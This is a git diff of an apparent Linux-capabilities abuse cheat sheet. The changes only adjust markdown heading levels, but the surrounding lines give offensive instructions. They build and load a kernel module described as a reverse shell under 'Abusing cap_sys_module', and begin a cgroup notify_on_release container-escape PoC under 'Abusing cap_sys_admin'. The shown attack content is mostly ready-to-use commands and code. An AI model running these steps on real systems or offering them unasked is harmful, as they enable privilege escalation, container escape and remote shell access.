@@ -70,14 +70,14 @@ sh to run shell
 ```
 
 
-# Abusing `cap_sys_module`
+## Abusing `cap_sys_module`
 
-## Install the following requirements
+### Install the following requirements
 ```bash
 apt update && apt install -y gcc make linux-headers
 ```
 
-## Create the kernel module - reverse shell
+### Create the kernel module - reverse shell
 ```bash
 #include <linux/kmod.h>
 #include <linux/module.h>
@@ -97,7 +97,7 @@ module_init(reverse_shell_init);
 module_exit(reverse_shell_exit);
 ```
 
-## Create the Makefile
+### Create the Makefile
 ```bash
 obj-m +=reverse-shell.o
 all:
@@ -106,20 +106,20 @@ clean:
 	make -C /lib/modules/$(uname -r)/build M=$(pwd) clean
 ```
 
-## Make and install the kenel module
+### Make and install the kenel module
 ```bash
 make && insmod reverse-shell.ko
 ```
 
 
-# Abusing `cap_sys_admin`
+## Abusing `cap_sys_admin`
 
-## Check the capabilities
+### Check the capabilities
 ```bash
 capsh --print
 ```
 
-## PoC
+### PoC
 ```bash
 mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
 echo 1 > /tmp/cgrp/x/notify_on_release
